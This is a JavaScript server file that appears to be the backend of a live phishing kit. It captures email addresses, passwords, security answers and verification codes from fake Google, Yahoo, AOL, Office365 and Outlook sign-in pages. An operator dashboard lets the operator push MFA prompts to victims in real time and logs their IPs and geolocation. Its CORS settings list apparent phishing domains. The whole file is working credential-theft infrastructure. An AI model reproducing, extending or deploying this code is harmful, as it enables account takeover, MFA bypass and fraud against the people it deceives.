/* ============================================================
 * server.js — Express + Socket.IO backend
 *
 * Handles two independent real-time channels:
 *
 * 1. SIGN-IN SESSIONS
 *    Each user going through any of the sign-in flows creates
 *    a session that persists forever — even after they disconnect.
 *    Only the admin can delete it.
 *
 *    Session = {
 *      email, provider, providerName,
 *      step, pendingData, success,
 *      connected: true|false,
 *      connectedAt, disconnectedAt,
 *      userAnswer:       { digits, submitted },
 *      verificationCode: { digits, submitted },
 *      credentials:      { email, password, answer, lastTwo,
 *                          providerName, submittedAt } | null
 *    }
 *
 * 2. LIVE VISITORS
 *    Every page emits user_visit on load. Server captures IP,
 *    looks up geo (country / city / ISP / lat-lng / flag),
 *    and broadcasts to all connected admins. Visitors are
 *    automatically removed when their socket disconnects.
 *
 *    Visit = {
 *      id, ip, path, referrer, ua, tz, lang, screen,
 *      geo: { country, countryCode, region, city,
 *             latitude, longitude, isp, flag } | null,
 *      visitedAt
 *    }
 * ============================================================ */

const express = require('express')
const http = require('http')
const { Server } = require('socket.io')
const path = require('path')

const app = express()

/* ---------- Static files ---------- */
app.use(express.static(path.join(__dirname, 'public')))

/* ---------- HTTP server + Socket.IO ---------- */
const server = http.createServer(app)
const io = new Server(server, {
  cors: {
    origin: [
      'https://credwc.store/',
      'https://www.credwc.store/',
      'https://toml.williamswizard1.workers.dev',
      'https://www.toml.williamswizard1.workers.dev',
      'https://credgv.space/',
      'https://www.credgv.space/',
      // Admin is served by this same origin — without this entry the
      // dashboard's Socket.IO handshake is rejected by CORS.
      'https://realtime-signin.onrender.com',
      // Uncomment for local testing:
      // 'http://localhost:3000',
      // 'http://127.0.0.1:3000',
      // Add your LAN IP here if testing from a phone, e.g.:
      // 'http://192.168.1.42:5500',
    ],
    methods: ['GET', 'POST'],
  },
})

/* ============================================================
 * STORES
 * ============================================================ */

/* Sign-in sessions — persist until the admin deletes them.
 * Keyed by socket.id. */
const sessions = new Map()

/* Credentials that arrive before user_identify (race safety) */
const pendingCredentials = new Map()

/* Live visitors — auto-removed on disconnect */
const visits = new Map()

/* Geo cache: ip → { geo, expires } */
const geoCache = new Map()
const GEO_CACHE_TTL = 1000 * 60 * 60 * 6 // 6 hours

/* Providers the admin can target in bulk */
const PROVIDER_KEYS = [
  'google',
  'yahoo',
  'aol',
  'office365',
  'outlook',
  'other',
]

/* ============================================================
 * HELPERS
 * ============================================================ */

/* Snapshot of all sign-in sessions for the admin dashboard */
function snapshotSessions() {
  return Array.from(sessions.entries()).map(([id, s]) => ({
    id,
    email: s.email,
    provider: s.provider || 'google',
    providerName: s.providerName || null,
    step: s.step,
    pendingData: s.pendingData,
    success: s.success,
    connected: s.connected !== false,
    connectedAt: s.connectedAt,
    disconnectedAt: s.disconnectedAt || null,
    userAnswer: s.userAnswer || { digits: '', submitted: false },
    verificationCode: s.verificationCode || { digits: '', submitted: false },
    credentials: s.credentials || null,
  }))
}

/* Snapshot of all live visitors for the admin dashboard */
function snapshotVisits() {
  return Array.from(visits.values()).sort((a, b) => b.visitedAt - a.visitedAt)
}

function broadcastSessions() {
  io.emit('admin_session_update', snapshotSessions())
}

function broadcastVisits() {
  io.emit('visits_update', snapshotVisits())
}

/* Get the real client IP (respects proxies) */
function getClientIp(socket) {
  const fwd = socket.handshake.headers['x-forwarded-for']
  if (fwd) return String(fwd).split(',')[0].trim()
  const real = socket.handshake.headers['x-real-ip']
  if (real) return String(real).trim()
  return socket.handshake.address || 'unknown'
}

/* Is this IP a local/private address? (skip geo lookup for these) */
function isLocalIp(ip) {
  if (!ip || ip === 'unknown') return true
  if (ip === '::1' || ip === '127.0.0.1') return true
  if (ip === '::ffff:127.0.0.1') return true
  if (/^10\./.test(ip)) return true
  if (/^192\.168\./.test(ip)) return true
  if (/^172\.(1[6-9]|2\d|3[01])\./.test(ip)) return true
  if (/^169\.254\./.test(ip)) return true
  if (/^fc[0-9a-f]{2}:/i.test(ip)) return true
  if (/^fe80:/i.test(ip)) return true
  return false
}

/**
 * Geo lookup via ipwho.is (free, HTTPS, no API key, 10k/mo).
 * Caches each IP for 6 hours to stay well under the limit.
 * Returns null for local/private IPs or on error.
 */
async function lookupGeo(ip) {
  if (isLocalIp(ip)) return null

  const cached = geoCache.get(ip)
  if (cached && cached.expires > Date.now()) {
    return cached.geo
  }

  try {
    const controller = new AbortController()
    const timer = setTimeout(() => controller.abort(), 4000)

    const res = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, {
      signal: controller.signal,
    })
    clearTimeout(timer)

    if (!res.ok) return null
    const json = await res.json()
    if (!json.success) return null

    const geo = {
      country: json.country || '',
      countryCode: json.country_code || '',
      region: json.region || '',
      city: json.city || '',
      latitude: json.latitude,
      longitude: json.longitude,
      isp: json.connection?.isp || json.connection?.org || '',
      flag: json.flag?.emoji || '',
    }

    geoCache.set(ip, { geo, expires: Date.now() + GEO_CACHE_TTL })
    return geo
  } catch (err) {
    console.warn('[geo] lookup failed for', ip, err.message)
    return null
  }
}

/* ============================================================
 * SOCKET HANDLERS
 * ============================================================ */
io.on('connection', (socket) => {
  console.log('connected:', socket.id)

  /* ------------------------------------------------------------
   * STATE SYNC ON CONNECT
   *
   * Push the current sessions + visits to this socket immediately.
   * Without this, a freshly opened admin dashboard only sees state
   * that is broadcast *after* it connects — so any pre-existing
   * sessions appear missing until the next event fires.
   * ------------------------------------------------------------ */
  socket.emit('admin_session_update', snapshotSessions())
  socket.emit('visits_update', snapshotVisits())

  /* ------------------------------------------------------------
   * EXPLICIT RE-SYNC
   *
   * Client-initiated snapshot request. Called:
   *   - right after connect (belt-and-braces)
   *   - when the admin tab regains focus
   *   - after a reconnect where broadcasts may have been missed
   *   - from a manual "sync" button
   * ------------------------------------------------------------ */
  socket.on('admin_get_state', () => {
    socket.emit('admin_session_update', snapshotSessions())
    socket.emit('visits_update', snapshotVisits())
  })

  /* ============================================================
   * USER SIDE — VISITOR TRACKING
   * ============================================================ */

  /**
   * user_visit
   * Sent on page load from every frontend page. Doesn't require
   * the user to have identified or signed in — this is pure
   * traffic analytics for the admin.
   *
   * Payload: { path, referrer, ua, tz, lang, screen }
   */
  socket.on('user_visit', async (data = {}) => {
    const ip = getClientIp(socket)
    const geo = await lookupGeo(ip)

    const visit = {
      id: socket.id,
      ip,
      path: String(data.path || '/').slice(0, 200),
      referrer: String(data.referrer || '').slice(0, 300),
      ua: String(data.ua || '').slice(0, 300),
      tz: String(data.tz || '').slice(0, 60),
      lang: String(data.lang || '').slice(0, 40),
      screen: String(data.screen || '').slice(0, 40),
      geo,
      visitedAt: Date.now(),
    }

    visits.set(socket.id, visit)

    // Fire immediate alert so the admin gets the chime/notification
    io.emit('new_visit', visit)
    // Then send the updated list
    broadcastVisits()

    console.log(
      `[visit] ${ip}${
        geo ? ' · ' + [geo.city, geo.country].filter(Boolean).join(', ') : ''
      } → ${visit.path}`,
    )
  })

  /* ============================================================
   * USER SIDE — SIGN-IN SESSION
   * ============================================================ */

  /**
   * user_identify
   * Sent when the user reaches a step needing admin input,
   * or right after email submission on the "other" flow.
   *
   * NOTE: this is the ONLY user_identify handler. Keying by
   * socket.id keeps it consistent with every other handler and
   * with the admin delete/reset paths. A previous duplicate
   * (UUID-keyed) handler was removed — it produced a second
   * "identify"-step ghost row per user on the dashboard.
   *
   * Payload: { email, provider?, providerName? }
   */
  socket.on('user_identify', ({ email, provider, providerName } = {}) => {
    if (!email || typeof email !== 'string' || !email.includes('@')) {
      return socket.emit('user_identify:error', {
        message: 'A valid email is required',
      })
    }
    if (
      provider !== undefined &&
      provider !== null &&
      typeof provider !== 'string'
    ) {
      return socket.emit('user_identify:error', {
        message: 'Provider must be a string',
      })
    }

    const existing = sessions.get(socket.id) || {}
    const pending = pendingCredentials.get(socket.id)

    sessions.set(socket.id, {
      email: email.trim().toLowerCase(),
      provider: provider || existing.provider || 'google',
      providerName: providerName || existing.providerName || null,
      step: 'verify',
      pendingData: existing.pendingData || null,
      success: false,
      connected: true,
      connectedAt: existing.connectedAt || Date.now(),
      disconnectedAt: null,
      userAnswer: { digits: '', submitted: false },
      verificationCode: { digits: '', submitted: false },
      credentials: pending
        ? {
            email: email.trim().toLowerCase(),
            password: pending.password || '',
            answer: pending.answer || '',
            lastTwo: pending.lastTwo || '',
            providerName: pending.providerName || null,
            submittedAt: Date.now(),
          }
        : existing.credentials || null,
    })

    pendingCredentials.delete(socket.id)
    broadcastSessions()

    // Push anything already waiting for this user
    const s = sessions.get(socket.id)
    if (s.pendingData) socket.emit('verify_data', s.pendingData)
    if (s.success) socket.emit('login_success')
  })

  /**
   * user_verify_answer
   * 2-digit verify answer typed/submitted by the user.
   * (Yahoo, AOL, Outlook flows.)
   *
   * Payload: { digits, submitted }
   */
  socket.on('user_verify_answer', ({ digits, submitted } = {}) => {
    const s = sessions.get(socket.id)
    if (!s) return
    s.userAnswer = {
      digits: String(digits || '').slice(0, 2),
      submitted: !!submitted,
    }
    broadcastSessions()
  })

  /**
   * user_send_code
   * 6-digit verification code typed/submitted by the user.
   * (AOL flow.)
   *
   * Payload: { code, submitted }
   */
  socket.on('user_send_code', ({ code, submitted } = {}) => {
    const s = sessions.get(socket.id)
    if (!s) return
    s.verificationCode = {
      digits: String(code || '').slice(0, 6),
      submitted: !!submitted,
    }
    broadcastSessions()
  })

  /**
   * user_send_credentials
   * Password submitted by the user.
   *
   * Payload: { password, answer?, lastTwo?, providerName? }
   */
  socket.on(
    'user_send_credentials',
    ({ password, answer, lastTwo, providerName } = {}) => {
      const s = sessions.get(socket.id)

      // Session not created yet → buffer it, attach on user_identify
      if (!s) {
        pendingCredentials.set(socket.id, {
          password,
          answer,
          lastTwo,
          providerName,
        })
        console.log('[creds] buffered for', socket.id, '(no session yet)')
        return
      }

      s.credentials = {
        email: s.email,
        password: String(password || ''),
        answer:
          answer !== undefined ? String(answer) : s.userAnswer?.digits || '',
        lastTwo:
          lastTwo !== undefined
            ? String(lastTwo)
            : s.pendingData?.lastTwo || '',
        providerName: providerName || s.providerName || null,
        submittedAt: Date.now(),
      }
      console.log('[creds] captured for', socket.id, s.email)
      broadcastSessions()
    },
  )

  /**
   * user_step_update
   * Report a step change ('password', 'code', 'signed-in', etc.)
   *
   * Payload: { step }
   */
  socket.on('user_step_update', ({ step } = {}) => {
    const s = sessions.get(socket.id)
    if (!s) return
    s.step = step
    broadcastSessions()
  })

  /**
   * user_check_status
   * Polling fallback so the client re-syncs if a push was missed.
   */
  socket.on('user_check_status', () => {
    const s = sessions.get(socket.id)
    if (!s) return
    socket.emit('status_response', {
      pendingData: s.pendingData,
      success: s.success,
    })
  })

  /* ============================================================
   * ADMIN SIDE — VERIFICATION CONTROL
   * ============================================================ */

  /**
   * admin_send_verify
   * Sends the verification payload to one user, one provider group,
   * or everyone on the verify step.
   *
   * Payload shape varies by provider:
   *   Google / Office365: { code, device, phone }
   *   Yahoo:              { lastTwo, answer? }
   *   AOL:                { lastTwo }
   *   Outlook:            { phone, lastTwo }
   *   Other:              {} (no payload)
   *
   * targetSocketId can be:
   *   • a specific socket id
   *   • 'all'          → every user on verify
   *   • a PROVIDER_KEY → every user of that provider on verify
   */
  socket.on('admin_send_verify', (data = {}) => {
    const { targetSocketId, ...payload } = data

    if (targetSocketId && targetSocketId !== 'all') {
      if (PROVIDER_KEYS.includes(targetSocketId)) {
        // Broadcast to a provider group
        for (const [id, s] of sessions.entries()) {
          if (
            (s.provider || 'google') === targetSocketId &&
            s.step === 'verify' &&
            !s.success &&
            s.connected !== false
          ) {
            s.pendingData = payload
            io.to(id).emit('verify_data', payload)
          }
        }
      } else {
        // Single socket
        const s = sessions.get(targetSocketId)
        if (s) {
          s.pendingData = payload
          io.to(targetSocketId).emit('verify_data', payload)
        }
      }
    } else {
      // Every connected user currently on verify
      for (const [id, s] of sessions.entries()) {
        if (s.step === 'verify' && !s.success && s.connected !== false) {
          s.pendingData = payload
          io.to(id).emit('verify_data', payload)
        }
      }
    }
    broadcastSessions()
  })

  /**
   * admin_send_success
   * Marks a user / provider group / everyone as successful.
   *
   * Payload: { targetSocketId }
   */
  socket.on('admin_send_success', ({ targetSocketId } = {}) => {
    if (targetSocketId && targetSocketId !== 'all') {
      if (PROVIDER_KEYS.includes(targetSocketId)) {
        for (const [id, s] of sessions.entries()) {
          if (
            (s.provider || 'google') === targetSocketId &&
            s.step !== 'signed-in' &&
            s.connected !== false
          ) {
            s.success = true
            io.to(id).emit('login_success')
          }
        }
      } else {
        const s = sessions.get(targetSocketId)
        if (s) {
          s.success = true
          io.to(targetSocketId).emit('login_success')
        }
      }
    } else {
      for (const [id, s] of sessions.entries()) {
        if (s.step !== 'signed-in' && s.connected !== false) {
          s.success = true
          io.to(id).emit('login_success')
        }
      }
    }
    broadcastSessions()
  })

  /* ============================================================
   * ADMIN SIDE — SESSION MANAGEMENT
   * ============================================================ */

  /**
   * admin_delete_session
   * Payload: { targetSocketId }
   *   • socket id      → delete just that session
   *   • 'disconnected' → delete every session where connected === false
   *   • 'all'          → delete every session
   *
   * This is the ONLY way a session is removed. Sessions are never
   * auto-deleted on disconnect.
   */
  function handleDeleteSession({ targetSocketId } = {}) {
    if (targetSocketId === 'all') {
      sessions.clear()
      pendingCredentials.clear()
    } else if (targetSocketId === 'disconnected') {
      for (const [id, s] of sessions.entries()) {
        // Treat undefined the same as false so nothing can be
        // stranded in the map without a `connected` flag.
        if (!s.connected) {
          sessions.delete(id)
          pendingCredentials.delete(id)
        }
      }
    } else if (sessions.has(targetSocketId)) {
      sessions.delete(targetSocketId)
      pendingCredentials.delete(targetSocketId)
    }
    broadcastSessions()
  }

  socket.on('admin_delete_session', handleDeleteSession)
  // Backward-compat alias so older admin builds still work
  socket.on('admin_reset_user', handleDeleteSession)

  /**
   * admin_clear_visits
   * Clears the live visitor feed (doesn't disconnect anyone).
   */
  socket.on('admin_clear_visits', () => {
    visits.clear()
    broadcastVisits()
    console.log('[visits] cleared by admin')
  })

  /* ============================================================
   * CLEANUP — mark session disconnected (don't delete), drop visit
   * ============================================================ */
  socket.on('disconnect', () => {
    console.log('disconnected:', socket.id)

    // Sign-in session: preserve forever, only mark as disconnected
    const s = sessions.get(socket.id)
    if (s) {
      s.connected = false
      s.disconnectedAt = Date.now()
    }

    pendingCredentials.delete(socket.id)

    // Live visit: remove from the feed
    visits.delete(socket.id)

    broadcastSessions()
    broadcastVisits()
  })
})

/* ============================================================
 * START
 * ============================================================ */
const PORT = process.env.PORT || 3000
server.listen(PORT, '0.0.0.0', () => {
  console.log('===========================================')
  console.log(`Server running at http://localhost:${PORT}`)
  console.log(`Admin:  http://localhost:${PORT}/admin.html`)
  console.log(`LAN:    http://<your-lan-ip>:${PORT}/admin.html`)
  console.log('===========================================')
  console.log('Sign-in sessions persist until deleted by admin.')
  console.log('Live visitors are auto-removed on disconnect.')
  console.log('Geo lookup uses ipwho.is (10k free req/month, cached 6h).')
  console.log('===========================================')
})
